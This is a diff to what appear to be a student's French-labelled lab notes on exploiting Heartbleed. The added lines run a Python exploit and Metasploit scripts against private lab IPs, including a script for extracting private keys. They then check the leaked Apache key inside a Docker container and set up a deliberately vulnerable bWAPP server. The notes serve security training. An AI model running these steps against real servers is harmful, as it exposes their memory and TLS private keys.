@@ -133,7 +133,34 @@ cd /home/etudiant/heartbleed-example
 watch sudo python heartbleed.py 192.168.1.173 -p 443
 
 
+################ + d'information décodée
+cd ./python/ && chmod +x exploit.python
+watch sudo python exploit.py 192.168.1.173 -p 443  
+10.10.3.155
 
-##### exploit via metapsloit
+
+##### exploit via metasploit
 sudo apt-get update -y && sudo apt-get install -y git && git clone https://github.com/amineAUPEC/heartbleed-automation.git 
-cd /home/etudiant/heartbleed-automation/bash/msf/ && sudo chmod +x metasploit.sh && sudo ./metasploit.sh
+cd /home/etudiant/heartbleed-automation/bash/msf/ && sudo chmod +x metasploit_heartbleed.sh && sudo ./metasploit_heartbleed.sh
+
+##### exploit via metasploit for private KEYS
+
+cd /home/etudiant/heartbleed-automation/bash/msf/ && sudo chmod +x metasploit_heartbleed_keys.sh && sudo ./metasploit_heartbleed_keys.sh
+
+- verify on server:
+  - connect to the container
+   dockerps_id=$(sudo docker ps | grep heartbleed | tr -s ' ' | cut -f 1 -d ' ') 
+   dockerps_id=$(sudo docker exec -it $dockerps_id bash) 
+
+watch /etc/apache2/ssl/apache.key
+
+watch 'cat /etc/apache2/ssl/apache.key; cat /etc/apache2/ssl/apache.crt'
+
+
+
+
+##### vulnerable server via BWAPP Docker container
+sudo hostnamectl set-hostname bwapp
+sudo chmod +x ./bash/install-docker.sh && sudo ./bash/install-docker.sh
+sudo docker run -d -p 80:80 -p 8443:8443 raesene/bwapp && ip a
+
